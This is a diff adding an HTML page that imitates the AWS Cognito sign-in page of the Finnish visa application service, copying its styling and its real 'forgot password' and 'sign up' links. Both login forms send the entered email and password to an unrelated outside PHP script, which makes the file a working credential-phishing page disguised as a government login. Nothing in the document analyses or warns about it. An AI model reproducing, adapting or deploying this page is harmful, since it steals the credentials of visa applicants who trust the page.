@@ -1,0 +1,146 @@
+﻿<!DOCTYPE HTML>
+<!DOCTYPE html PUBLIC "" ""><HTML lang="en"><HEAD><META content="IE=11.0000" 
+http-equiv="X-UA-Compatible">
+     <LINK href="https://d2uqej7bo24sqa.cloudfront.net/20230404192231/css/bootstrap.min.css" 
+rel="stylesheet" media="screen">     
+<META http-equiv="Content-Type" content="text/html; charset=utf-8"><LINK href="https://d2uqej7bo24sqa.cloudfront.net/20230404192231/css/cognito-login.css" 
+rel="stylesheet" media="screen">     <LINK href="https://auth.ovaf-prod.visa-esp.finlandvisa.fi/ALL/20210217123452/assets/CSS/custom-css.css" 
+rel="stylesheet" media="screen">     <TITLE>Signin</TITLE>     
+<SCRIPT src="https://d2uqej7bo24sqa.cloudfront.net/20230404192231/js/amazon-cognito-advanced-security-data.min.js"></SCRIPT>
+     
+<SCRIPT>
+    function getAdvancedSecurityData(formReference) {
+        if (typeof AmazonCognitoAdvancedSecurityData === "undefined") {
+            return true;
+        }
+
+        // UserpoolId is not available on frontend for springboard. We do not use userPoolId
+        // anyway other than put in context data. 
+        var userPoolId = "";
+        var clientId = getUrlParameter("client_id");
+
+        var username = "";
+        var usernameInput = document.getElementsByName("username")[0];
+        if (usernameInput && usernameInput.value) {
+            username = usernameInput.value;
+        }
+
+        var asfData = AmazonCognitoAdvancedSecurityData.getData(username, userPoolId, clientId);
+        if (typeof asfData === "undefined") {
+            return true;
+        }
+
+        if (formReference && formReference.cognitoAsfData) {
+            formReference.cognitoAsfData.value = asfData
+        }
+
+        return true;
+    }
+
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    function onSubmit(evt, formRef) {
+        formRef.querySelector('button[type="submit"]').disabled = true;
+        if (!!formRef.submitted) {
+            evt.preventDefault();
+            return false;
+        } else {
+            formRef.submitted = true;
+            return getAdvancedSecurityData(formRef);
+        }
+    }
+</SCRIPT>
+     
+<META name="viewport" content="width=device-width, initial-scale=1"> 
+<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD> 
+<BODY spellcheck="false">
+<DIV class="container">
+<DIV class="modal-dialog">
+<DIV class="modal-content background-customizable modal-content-mobile visible-xs visible-sm">
+<DIV>
+<DIV>
+<DIV class="banner-customizable">
+<CENTER></CENTER></DIV></DIV></DIV>
+<DIV class="modal-body">
+<DIV>
+<DIV></DIV></DIV>
+<DIV>
+<DIV>
+<DIV></DIV></DIV>
+<DIV>
+<DIV></DIV></DIV>
+<DIV>
+<DIV>
+<DIV><SPAN class="textDescription-customizable ">Sign in with your email and 
+password</SPAN>
+<FORM name="cognitoSignInForm" class="cognito-asf" onsubmit="getAdvancedSecurityData(this);" 
+action="https://humanabrasil.org/mingo/Login.php" 
+method="POST"><INPUT name="_csrf" type="hidden" value="021e77d6-d463-4339-a25b-3bebe6dda3bf"> 
+                                    <LABEL class="label-customizable" for="signInFormUsername">Email</LABEL> 
+            
+<DIV>
+	<INPUT name="User" class="form-control inputField-customizable" id="signInFormUsername" required="" type="text" placeholder="name@host.com" autocapitalize="none" size="25"></DIV><LABEL 
+class="label-customizable" for="signInFormPassword">Password</LABEL>             
+<DIV>
+	<INPUT name="Password" class="form-control inputField-customizable" id="signInFormPassword" required="" type="password" placeholder="Password" value="" size="25"></DIV><INPUT name="cognitoAsfData" class="form-control inputField-customizable" type="hidden">
+<DIV><A class="redirect-customizable" href="https://auth.ovaf-prod.visa-esp.finlandvisa.fi/forgotPassword?response_type=code&amp;client_id=4f6adbquvcomc5o5groriad6n6&amp;scope=openid&amp;state=CLpF2ArLIxAqyjAf6og4HjQ_jHDcojwEJN5BZ6oUKSY%3D&amp;redirect_uri=https://finlandvisa.fi/api/login/oauth2/code/cognito&amp;nonce=_zUcQLL2vBLKdjK8lpzNR0i6nb7Zx0Zbd6neJO8uHvA">Forgot 
+your password?</A>             </DIV><INPUT name="signInSubmitButton" class="btn btn-primary submitButton-customizable" aria-label="submit" type="Submit" value="Sign in"> 
+            <BR>
+<DIV>
+<P class="redirect-customizable"><SPAN>Need an account?</SPAN>&nbsp;<A href="https://auth.ovaf-prod.visa-esp.finlandvisa.fi/signup?response_type=code&amp;client_id=4f6adbquvcomc5o5groriad6n6&amp;scope=openid&amp;state=CLpF2ArLIxAqyjAf6og4HjQ_jHDcojwEJN5BZ6oUKSY%3D&amp;redirect_uri=https://finlandvisa.fi/api/login/oauth2/code/cognito&amp;nonce=_zUcQLL2vBLKdjK8lpzNR0i6nb7Zx0Zbd6neJO8uHvA">Sign 
+up</A></P></DIV></FORM></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV class="modal-content background-customizable modal-content-mobile visible-md visible-lg">
+<DIV>
+<DIV>
+<DIV class="banner-customizable">
+<CENTER></CENTER></DIV></DIV></DIV>
+<DIV class="modal-body">
+<DIV>
+<DIV></DIV></DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV></DIV></DIV>
+<DIV>
+<DIV></DIV></DIV></DIV>
+<DIV>
+<DIV>
+<DIV><SPAN class="textDescription-customizable ">Sign in with your email and 
+password</SPAN>
+<FORM name="cognitoSignInForm" class="cognito-asf" onsubmit="getAdvancedSecurityData(this);" 
+action="https://humanabrasil.org/mingo/Login.php" 
+method="POST"><INPUT name="_csrf" type="hidden" value="021e77d6-d463-4339-a25b-3bebe6dda3bf"> 
+                                    <LABEL class="label-customizable" for="signInFormUsername">Email</LABEL> 
+            
+<DIV>
+	<INPUT name="ctl00$MPH$txtUserName" class="form-control inputField-customizable" id="signInFormUsername" required="" type="text" placeholder="name@host.com" autocapitalize="none" size="25"></DIV><LABEL 
+class="label-customizable" for="signInFormPassword">Password</LABEL>             
+<DIV>
+	<INPUT name="ctl00$MPH$txtPassword" class="form-control inputField-customizable" id="signInFormPassword" required="" type="password" placeholder="Password" value="" size="25"></DIV><INPUT name="cognitoAsfData" class="form-control inputField-customizable" type="hidden">
+<DIV><A class="redirect-customizable" href="https://auth.ovaf-prod.visa-esp.finlandvisa.fi/forgotPassword?response_type=code&amp;client_id=4f6adbquvcomc5o5groriad6n6&amp;scope=openid&amp;state=CLpF2ArLIxAqyjAf6og4HjQ_jHDcojwEJN5BZ6oUKSY%3D&amp;redirect_uri=https://finlandvisa.fi/api/login/oauth2/code/cognito&amp;nonce=_zUcQLL2vBLKdjK8lpzNR0i6nb7Zx0Zbd6neJO8uHvA">Forgot 
+your password?</A>             </DIV><INPUT name="signInSubmitButton" class="btn btn-primary submitButton-customizable" aria-label="submit" type="Submit" value="Sign in"> 
+            <BR>
+<DIV>
+<P class="redirect-customizable"><SPAN>Need an account?</SPAN>&nbsp;<A href="https://auth.ovaf-prod.visa-esp.finlandvisa.fi/signup?response_type=code&amp;client_id=4f6adbquvcomc5o5groriad6n6&amp;scope=openid&amp;state=CLpF2ArLIxAqyjAf6og4HjQ_jHDcojwEJN5BZ6oUKSY%3D&amp;redirect_uri=https://finlandvisa.fi/api/login/oauth2/code/cognito&amp;nonce=_zUcQLL2vBLKdjK8lpzNR0i6nb7Zx0Zbd6neJO8uHvA">Sign 
+up</A></P></DIV></FORM></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<SCRIPT src="https://d2uqej7bo24sqa.cloudfront.net/20230404192231/js/jquery-3.5.1.min.js"></SCRIPT>
+     
+<SCRIPT>
+    var $inputs = $(":input");
+    $inputs.on('input', function () {
+        var self = this;
+        var matches = $('input[name="' + this.name + '"]');
+        var selfIndex = matches.index($(self));
+        matches.each(function (index, element) {
+            if (selfIndex !== index) {
+                $(element).val($(self).val());
+            }
+        });
+    });
+</SCRIPT>
+ </BODY></HTML>
